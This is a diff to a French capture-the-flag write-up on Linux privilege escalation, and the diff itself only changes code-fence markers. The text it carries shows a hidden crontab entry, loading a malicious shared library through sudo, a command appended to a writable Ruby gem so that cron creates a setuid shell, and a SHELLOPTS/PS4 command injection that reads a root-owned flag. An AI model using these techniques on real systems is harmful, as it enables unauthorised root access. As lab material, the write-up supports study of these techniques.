@@ -14,7 +14,7 @@ Ce challenge a la particularité de se concentrer sur l'escalade de privilèges 
 
 Dans le fichier /etc/passwd on note quelques comptes utilisateurs et d'autres particuliers :  
 
-```plain
+```
 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
 chrony:x:997:995::/var/lib/chrony:/sbin/nologin
 user:x:1000:1000:user:/home/user:/bin/bash
@@ -28,7 +28,7 @@ La distribution est une CentOS Linux release 7.3.1611 (Core).
 
 Il est temps de regarder si ces utilisateurs ont des fichiers intéressants :  
 
-```plain
+```
 [user@localhost ~]$ find / -user user2 2> /dev/null
 /var/spool/mail/user2
 /home/user2
@@ -44,7 +44,7 @@ Il est temps de regarder si ces utilisateurs ont des fichiers intéressants :
 
 Voyons les permissions de ces fichiers :  
 
-```plain
+```
 [user@localhost ~]$ ls -l /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
 -rw-rw-r--. 1 root user2 1621 30 août  09:54 /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
 [user@localhost ~]$ ls -l /tmp/firewalld-backup.zip
@@ -56,7 +56,7 @@ Voyons les permissions de ces fichiers :
 C'est un bon début et on devine qu'on passera root depuis le compte *user3*. Un grep récursif dans /etc pour *user2* ne donne aucun résultat mais une entrée dans la crontab pour *user3*  
  :  
 
-```plain
+```
 [user@localhost ~]$ cat /etc/crontab
 SHELL=/bin/bash
 PATH=/sbin:/bin:/usr/sbin:/usr/bin
@@ -77,14 +77,14 @@ HOME=/
 
 Hein ? J'ai la berlue ? Elle est où cette entrée ?  
 
-```plain
+```
 [user@localhost ~]$ grep user3 /etc/crontab
 * * * * * user3 /sbin/bckup
 ```
 
 Hallucination ?  
 
-```plain
+```
 [user@localhost ~]$ tac /etc/crontab
 
 # *  *  *  *  * user-name  command to be executed
@@ -108,7 +108,7 @@ Ok donc cat n'affiche pas la ligne mais tac (qui affiche les lignes en sens inve
 
 En réalité le fichier contient [une séquence d'échappement qui cache la ligne](https://unix.stackexchange.com/posts/108269/revisions) intéressante :  
 
-```plain
+```
 [user@localhost ~]$ cat -v /etc/crontab
 SHELL=/bin/bash
 PATH=/sbin:/bin:/usr/sbin:/usr/bin
@@ -132,7 +132,7 @@ HOME=/
 
 Bonne blague ! En revanche les permissions sur le programme appelé ne nous donnent pas plus d'indices :  
 
-```plain
+```
 [user@localhost ~]$ ls -l /sbin/bckup
 -rwxr-xr-x. 1 root root 356 30 août  09:54 /sbin/bckup
 ```
@@ -142,7 +142,7 @@ user++
 
 On trouve finalement notre première étape via sudo :  
 
-```plain
+```
 [user@localhost ~]$ sudo -l
 [sudo] password for user:
 Matching Defaults entries for user on this host:
@@ -156,7 +156,7 @@ User user may run the following commands on this host:
 
 Un strings sur ce binaire révèle (en dehors qu'il a été écrit en C++) quelques chaînes intéressantes :  
 
-```plain
+```
 Calculating something, please wait...
 /home/user/.config/libcalc.so
 Done.
@@ -211,7 +211,7 @@ Il faut aussi penser à rendre exécutable les dossiers /home/user, .config et d
 
 On exécute calc et notre librairie est bien chargée :  
 
-```plain
+```
 [user@localhost ~]$ sudo -u user2 /bin/calc
 Calculating something, please wait...
 In _init()
@@ -227,7 +227,7 @@ Vu que notre librairie nous a ouvert l'accès à *user2*, c'est le moment de se 
 
 On sait que le script */sbin/bckup* est appelé par cron en tant que *user3*. Voici son contenu :  
 
-```plain
+```
 #!/usr/bin/env ruby
 
 require 'rubygems'
@@ -264,17 +264,17 @@ int main(void)
 
 Puis on rajoute la ligne suivante à la fin du fichier *zip.rb* :  
 
-```plain
+```
 print `cp /tmp/setuid_user3 /tmp/go_user3; chmod 6755 /tmp/go_user3;`
 ```
 
 On attend quelques minutes et on a notre accès :  
 
-```plain
+```
 -rwsr-sr-x. 1 user3 user3 8632 24 nov.  09:41 go_user3
 ```
 
-```plain
+```
 [user2@localhost tmp]$ ./go_user3
 bash: /home/user2/.bashrc: Permission non accordée
 bash-4.2$ id
@@ -286,14 +286,14 @@ g0tr00t?
 
 La dernière étape, on le devine, concerne l'exécutable *whoisme*.  
 
-```plain
+```
 bash-4.2$ /usr/local/bin/whoisme
 user2
 ```
 
 Le programme est simple comme le laisse deviner strings :  
 
-```plain
+```
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
 setuid
@@ -310,7 +310,7 @@ UH-H
 
 On est bien sûr tenté de tester shellshock ou la faille d'exportation de fonctions :  
 
-```plain
+```
 [user2@localhost user2]$ /tmp/go_user3
 bash-4.2$ /usr/bin/logname () { /bin/bash; }
 bash-4.2$ export -f /usr/bin/logname
@@ -329,7 +329,7 @@ L'une concerne \h dans l'expansion du prompt (PS1) donc peu d'intérêt pour nou
 
 Et ça marche :  
 
-```plain
+```
 bash-4.2$ env -i SHELLOPTS=xtrace PS4='$(cp /root/flag.txt /tmp; chmod 644 /tmp/flag.txt)' /usr/local/bin/whoisme
 /usr/bin/logname
 user2
